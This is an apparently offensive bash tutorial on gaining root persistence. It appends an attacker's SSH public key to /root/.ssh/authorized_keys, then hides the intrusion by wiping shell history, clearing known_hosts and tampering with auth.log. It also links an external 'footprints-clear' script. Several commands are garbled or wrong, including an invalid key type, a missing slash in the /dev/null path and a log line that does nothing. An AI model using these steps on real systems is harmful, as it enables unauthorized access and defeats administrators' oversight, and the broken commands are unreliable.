#!/bin/bash
# "#!" called as a shebang or sharp Bang.
echo "hack!"
echo "++++++IP Grabbing from ifconfig+++++++"
echo "  ########  #######   ########  "
echo "     ##     ##    #      ##     "
echo "     ##     ## ###       ##     "
echo "     ##     ##    #      ##     "
echo "     ##     #######      ##     "
echo "-------------------------------------"

# Granting permission and getting access to the root privillages without root password using ssh public and private key.

# Creating a RSA key
```
$ ssh-keygen -t id_rsa
```

```
$ echo "ssh-rsa AAAAB3NzaC1yc2EA************************************************************************************************************************
********************************************************************************************************************************************************
*******************************************************************************************************8ehDypNioECVpYU= theblackthreat@theblackthreat" 
>> /root/.ssh/authorized_keys
```
#You can create a script according to your requirment for my case I'm create script that can clear the footprint of mine 
**save the script https://raw.githubusercontent.com/theblackthreat/Bash-Scirpt/main/footprints-clear.sh**

```
$cat > shell.sh
#!/bin/bash
echo $(id)
echo "ssh-rsa AAAAB3NzaC1yc2EA************************************************************************************************************************
********************************************************************************************************************************************************
*******************************************************************************************************8ehDypNioECVpYU= root@kali" 
>> /root/.ssh/authorized_keys

cat dev/null > ~/.bash_history
history -c
echo "" /var/log/auth.log //this will edit the text from null to the auth logs.
rm  -f .ssh/known_hosts
```























